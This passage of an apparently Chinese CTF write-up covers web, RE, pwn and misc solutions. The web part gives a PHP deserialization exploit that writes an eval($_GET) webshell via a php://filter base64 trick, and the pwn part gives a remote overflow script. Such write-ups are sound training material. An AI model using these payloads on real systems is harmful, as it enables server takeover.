class="hljs-variable">$char</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;char = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Zhangsan</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;char))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;char-&gt;<span class="hljs-title function_ invoke__">Nihao</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You look upset&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lisi</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$text</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; text = <span class="hljs-variable">$text</span>;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Nihao</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$d</span>   = <span class="hljs-string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$a</span>= <span class="hljs-variable">$d</span>. <span class="hljs-variable language_">$this</span>-&gt;text;<br>         @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; file,<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Zhangsan</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Nihao</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m so happy&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>上个源码，定位关键代码有个死亡绕过，用base64进行绕过解密即可，上exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Who</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$char</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;char = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Zhangsan</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;char))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;char-&gt;<span class="hljs-title function_ invoke__">Nihao</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You look upset&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lisi</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$text</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; text = <span class="hljs-variable">$text</span>;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Nihao</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$d</span>   = <span class="hljs-string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$a</span>= <span class="hljs-variable">$d</span>. <span class="hljs-variable language_">$this</span>-&gt;text;<br>         @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; file,<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Zhangsan</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Nihao</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m so happy&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$exp</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Who</span>;<br><span class="hljs-variable">$exp</span>-&gt;char =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Lisi</span>;<br><span class="hljs-variable">$exp</span>-&gt;char-&gt;file =<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=orange.php&quot;</span>;<br><span class="hljs-variable">$exp</span>-&gt;char-&gt;text =<span class="hljs-string">&quot;aaaPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4=&quot;</span>;<br><span class="hljs-comment">// 需要匹配构成四的倍数</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Who%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>char%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Lisi%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A60%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>php%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Ffilter%<span class="hljs-number">2</span>Fwrite%<span class="hljs-number">3</span>Dconvert.base64-decode%<span class="hljs-number">2</span>Fresource%<span class="hljs-number">3</span>Dorange.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>text%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A35%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>aaaPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>最后命令执行即可</p><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16121120.png" alt="2024-11-16121120"></p><h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> re</h2><h3 id="re签到"><a class="markdownIt-Anchor" href="#re签到"></a> RE签到</h3><p>直接看附件拼接就行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;flag&#123;&quot;</span>);<br> <span class="hljs-built_in">strcat</span>(v5, <span class="hljs-string">&quot;re_1&quot;</span>);<br> <span class="hljs-built_in">strcat</span>(v5, <span class="hljs-string">&quot;basic_re&quot;</span>);<br> <span class="hljs-built_in">strcat</span>(v5, <span class="hljs-string">&quot;_12&#125;&quot;</span>);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome!&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">flag&#123;re<span class="hljs-emphasis">_1basic_</span>re<span class="hljs-emphasis">_12&#125;</span><br></code></pre></td></tr></table></figure><h3 id="happysunday"><a class="markdownIt-Anchor" href="#happysunday"></a> HappySunday</h3><p>ida打开看主函数</p><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16123039.png" alt="2024-11-16123039"></p><p>要求输入以 flag{ 开头，并且最后有一个 } 字符，输入的字符串进入 sub-140001010 函数和 sub_140001630 函数 ，如然后再进入 sub_140001680 函数，如果对比成功，则输 出&quot;successed&quot;</p><p>看一下1010的内容</p><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16123235.png" alt="2024-11-16123235"></p><p>来像 base64 编码流程，进入4400看一下内容</p><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16123452.png" alt="2024-11-16123452"></p><p>先转化为字符能得到类似 base64 表 ： ABCDEFGHIJKLMN0PQRSTUVWXYZabcdefghijklmnOpqrstuvwxyzo123456789+/</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">ida_chars = [<span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4A</span>,<br><span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>,<br><span class="hljs-number">0x55</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>,<br><span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6E</span>,<br><span class="hljs-number">0x4F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x78</span>,<br><span class="hljs-number">0x79</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>,<br><span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2F</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ida_chars)):<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(ida_chars[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>进到1630里</p><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16123754.png" alt="2024-11-16123754"></p><p>可以看到是一个循环，与 0x78 异或</p><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16124006.png" alt="2024-11-16124006"></p><p>写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>result = <span class="hljs-string">&quot;&quot;</span><br>chars = [<span class="hljs-number">0x7A</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x20</span>,<br><span class="hljs-number">0x49</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x4D</span>,<br><span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x2D</span>,<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">29</span>):<br>    chars[i]=chars[i]^<span class="hljs-number">0x78</span><br>result = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> chars])<br>CHAR_DATA =<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>New = <span class="hljs-string">&quot;ABCDEFGHIJKLMN0PQRSTUVWXYZabcdefghijklmnOpqrstuvwxyzo123456789+/&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64decode(result.translate(<span class="hljs-built_in">str</span>.maketrans(New, CHAR_DATA))))<br></code></pre></td></tr></table></figure><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> pwn</h2><h3 id="pwn1"><a class="markdownIt-Anchor" href="#pwn1"></a> pwn1</h3><p>直接溢出进到sh里就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&#x27;221.178.230.105&#x27;</span>, <span class="hljs-number">35765</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span> + <span class="hljs-string">b&#x27;admin&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8/2024-11-16095045.png" alt="2024-11-16095045"></p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="keyboard"><a class="markdownIt-Anchor" href="#keyboard"></a> keyboard</h3><p>敲击码流量包</p><p>网上搜个脚本一把梭就行了，没有难度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> tempfile <span class="hljs-keyword">import</span> NamedTemporaryFile<br><br>BOOT_KEYBOARD_MAP = &#123;<br>    <span class="hljs-number">0x00</span>: (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>),                         <span class="hljs-comment"># Reserved (no event indicated)</span><br>    <span class="hljs-number">0x01</span>: (<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>),                             <span class="hljs-comment"># ErrorRollOver</span><br>    <span class="hljs-number">0x02</span>: (<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>),                             <span class="hljs-comment"># POSTFail</span><br>    <span class="hljs-number">0x03</span>: (<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>),                             <span class="hljs-comment"># ErrorUndefined</span><br>    <span class="hljs-number">0x04</span>: (<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>),                           <span class="hljs-comment"># a</span><br>    <span class="hljs-number">0x05</span>: (<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>),                           <span class="hljs-comment"># b</span><br>    <span class="hljs-number">0x06</span>: (<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>),                           <span class="hljs-comment"># c</span><br>    <span class="hljs-number">0x07</span>: (<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>),                           <span class="hljs-comment"># d</span><br>    <span class="hljs-number">0x08</span>: (<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>),                           <span class="hljs-comment"># e</span><br>    <span class="hljs-number">0x09</span>: (<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>),                           <span class="hljs-comment"># f</span><br>    <span class="hljs-number">0x0a</span>: (<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>),                           <span class="hljs-comment"># g</span><br>    <span class="hljs-number">0x0b</span>: (<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>),                           <span class="hljs-comment"># h</span><br>    <span class="hljs-number">0x0c</span>: (<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>),                           <span class="hljs-comment"># i</span><br>    <span class="hljs-number">0x0d</span>: (<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>),                           <span class="hljs-comment"># j</span><br>    <span class="hljs-number">0x0e</span>: (<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>),                           <span class="hljs-comment"># k</span><br>    <span class="hljs-number">0x0f</span>: (<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>),                           <span class="hljs-comment"># l</span><br>    <span class="hljs-number">0x10</span>: (<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>),                           <span class="hljs-comment"># m</span><br>    <span class="hljs-number">0x11</span>: (<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>),                           <span class="hljs-comment"># n</span><br>    <span class="hljs-number">0x12</span>: (<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>),                           <span class="hljs-comment"># o</span><br>    <span class="hljs-number">0x13</span>: (<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>),                           <span class="hljs-comment"># p</span><br>    <span class="hljs-number">0x14</span>: (<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>),                           <span class="hljs-comment"># q</span><br>    <span class="hljs-number">0x15</span>: (<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>),                           <span class="hljs-comment"># r</span><br>    <span class="hljs-number">0x16</span>: (<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>),                           <span class="hljs-comment"># s</span><br>    <span class="hljs-number">0x17</span>: (<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>),                           <span class="hljs-comment"># t</span><br>    <span class="hljs-number">0x18</span>: (<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>),                           <span class="hljs-comment"># u</span><br>    <span class="hljs-number">0x19</span>: (<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>),                           <span class="hljs-comment"># v</span><br>    <span class="hljs-number">0x1a</span>: (<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>),                           <span class="hljs-comment"># w</span><br>    <span class="hljs-number">0x1b</span>: (<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>),                           <span class="hljs-comment"># x</span><br>    <span class="hljs-number">0x1c</span>: (<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>),                           <span class="hljs-comment"># y</span><br>    <span class="hljs-number">0x1d</span>: (<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>),                           <span class="hljs-comment"># z</span><br>    <span class="hljs-number">0x1e</span>: (<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>),                           <span class="hljs-comment"># 1</span><br>    <span class="hljs-number">0x1f</span>: (<span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>),                           <span class="hljs-comment"># 2</span><br>    <span class="hljs-number">0x20</span>: (<span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>),                           <span class="hljs-comment"># 3</span><br>    <span class="hljs-number">0x21</span>: (<span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>),                           <span class="hljs-comment"># 4</span><br>    <span class="hljs-number">0x22</span>: (<span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>),                           <span class="hljs-comment"># 5</span><br>    <span class="hljs-number">0x23</span>: (<span class="hljs-string">&#x27;6&#x27;</span>, <span 